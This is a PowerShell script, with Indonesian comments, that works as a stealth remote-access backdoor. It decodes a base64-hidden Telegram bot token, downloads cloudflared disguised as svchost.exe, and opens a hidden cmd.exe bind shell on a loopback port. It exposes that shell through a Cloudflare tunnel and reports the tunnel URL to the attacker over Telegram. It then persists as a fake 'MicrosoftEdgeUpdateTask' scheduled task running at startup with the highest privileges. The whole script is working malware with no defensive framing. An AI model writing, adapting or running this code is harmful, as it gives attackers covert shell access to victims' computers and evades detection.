# ========== KONFIGURASI TERSEMBUNYI ==========
$p0 = "ODcwMzA4MjE3MzpBQUhRY2VTZTdLSWdSbTk3M3o4YUctV0xQN3VzMHRxSExWOA=="
$p1 = "NjIyMzI2MTAxOA=="
$p2 = "c3ZjaG9zdC5leGU="
$p3 = "LmNvbmZpZ1xkYnVz"
$p4 = "LmNmLQ=="

function d {
    param($s)
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
}
$TOKEN = d $p0
$CHAT = d $p1
$BIN = d $p2
$CFG = "$env:USERPROFILE\" + (d $p3)
$TMPD = "$env:TEMP\" + (d $p4) + $env:USERNAME
$PORT = Get-Random -Min 10000 -Max 50000

# ========== FUNGSI UTAMA (rename samar) ==========
function t { param($m) if ($TOKEN -and $CHAT) { $b = @{chat_id=$CHAT; text=$m; parse_mode='HTML'}; try { (New-Object Net.WebClient).UploadString("https://api.telegram.org/bot$TOKEN/sendMessage", [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UE9TVA==")), (ConvertTo-Json $b)) } catch {} } }

function a {
    if ([Environment]::Is64BitOperatingSystem) { "windows-amd64" } else { "windows-386" }
}
function d2 {
    $u = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$(a).exe"
    $o = "$TMPD\cl.exe"
    try { (New-Object Net.WebClient).DownloadFile($u, $o); $o } catch { $null }
}
function b {
    param($p)
    $s = {
        param($p)
        $l = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, $p)
        $l.Start()
        while($true){
            $c=$l.AcceptTcpClient()
            $s=$c.GetStream()
            $w=New-Object IO.StreamWriter($s)
            $r=New-Object IO.StreamReader($s)
            $pr=New-Object Diagnostics.Process
            $pr.StartInfo.FileName="cmd.exe"
            $pr.StartInfo.UseShellExecute=$false
            $pr.StartInfo.RedirectStandardInput=$true
            $pr.StartInfo.RedirectStandardOutput=$true
            $pr.StartInfo.RedirectStandardError=$true
            $pr.StartInfo.CreateNoWindow=$true
            $pr.Start()|Out-Null
            $pr.StandardInput.WriteLine("cd %userprofile%")
            $pr.StandardInput.AutoFlush=$true
            $pr.BeginOutputReadLine()
            $pr.BeginErrorReadLine()
            $pr.OutputDataReceived+={param($s,$e)if($e.Data){$w.WriteLine($e.Data);$w.Flush()}}
            $pr.ErrorDataReceived+={param($s,$e)if($e.Data){$w.WriteLine($e.Data);$w.Flush()}}
            while($c.Connected){
                if($s.DataAvailable){
                    $line=$r.ReadLine()
                    if(!$line){break}
                    $pr.StandardInput.WriteLine($line)
                    $pr.StandardInput.Flush()
                }
                Start-Sleep -Milli 100
            }
            $pr.Close();$c.Close()
        }
        $l.Stop()
    }
    $id=Start-Process powershell -Arg "-NoP -Exec Bypass -Win Hidden -C `"$s`" -p $p" -Win Hidden -PassThru
    $id.Id
}
function c {
    param($b, $p)
    $l = "$TMPD\cf.log"
    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName = $b
    $psi.Arguments = "tunnel --url tcp://127.0.0.1:$p"
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    $pr = [Diagnostics.Process]::Start($psi)
    $pr.OutputDataReceived += {
        param($s, $e)
        if($e.Data){
            Add-Content $l $e.Data
            if($e.Data -match 'https://([a-z0-9-]+)\.trycloudflare\.com'){
                $u=$matches[0]
                $uf="$TMPD\url.txt"
                if(-not (Test-Path $uf) -or (Select-String $uf $u -Quiet) -eq $false){
                    Add-Content $uf $u
                    t "<b>New Tunnel URL</b>`n$u`n`nUse: cloudflared access tcp --hostname $u --url localhost:4444 && nc localhost 4444"
                }
            }
        }
    }
    $pr.BeginOutputReadLine()
    $pr.BeginErrorReadLine()
    $pr.Id
}
function p {
    param($s)
    $tn = "MicrosoftEdgeUpdateTask"
    $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -Exec Bypass -Win Hidden -File `"$s`""
    $t = New-ScheduledTaskTrigger -AtStartup
    $pri = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest
    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName $tn -Action $a -Trigger $t -Principal $pri -Settings $set -Force | Out-Null
}
function r {
    $tn = "MicrosoftEdgeUpdateTask"
    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
}
function u {
    if(Test-Path "$CFG\.uninstall_token"){ Remove-Item -Recurse -Force $CFG -ErrorAction SilentlyContinue }
    if(Test-Path $TMPD){ Remove-Item -Recurse -Force $TMPD -ErrorAction SilentlyContinue }
    r
    Write-Host "Removed."; exit 0
}
# ========== MAIN ==========
if($env:CF_FORCE -eq "1"){ u }
if(Test-Path "$CFG\.uninstall_token"){ Write-Host "Already installed. Use `$env:CF_FORCE=1 to overwrite."; exit 1 }
if(Test-Path $TMPD){ Remove-Item -Recurse -Force $TMPD }
New-Item -ItemType Dir -Path $TMPD -Force | Out-Null
Write-Host "Downloading..."
$cf = d2
if(!$cf){ Write-Host "Failed."; exit 1 }
New-Item -ItemType Dir -Path $CFG -Force | Out-Null
$dest = "$CFG\$BIN"
Copy-Item $cf $dest -Force
& $dest --version | Out-Null
if($LASTEXITCODE -ne 0){ Write-Host "Test failed."; exit 1 }
$tok = -join ((48..57)+(97..122) | Get-Random -Count 16 | %{[char]$_})
$tok | Out-File "$CFG\.uninstall_token" -Encoding ascii
Write-Host "To uninstall: `$env:CF_UNINSTALL=$tok and run script again."
Write-Host "Starting bind..."
$pid1 = b $PORT
Write-Host "Starting tunnel..."
$pid2 = c $dest $PORT
@"
BIND_PID=$pid1
TUNNEL_PID=$pid2
PORT=$PORT
"@ | Out-File "$CFG\tunnel.conf" -Encoding ascii
Start-Sleep -Seconds 5
$log = "$TMPD\cf.log"
if(Test-Path $log){
    $con = Get-Content $log -Raw
    if($con -match 'https://([a-z0-9-]+)\.trycloudflare\.com'){
        $url = $matches[0]
        Write-Host "✅ URL: $url" -ForegroundColor Green
        t "<b>Initial Tunnel URL</b>`n$url"
    } else { Write-Host "URL not detected yet." }
}
$myscript = $MyInvocation.MyCommand.Path
if(!$myscript){ $myscript = "$CFG\win.ps1"; Copy-Item $MyInvocation.MyCommand.Definition $myscript -Force }
p $myscript
Write-Host "Persistence done. Use CF_UNINSTALL=$tok to uninstall."
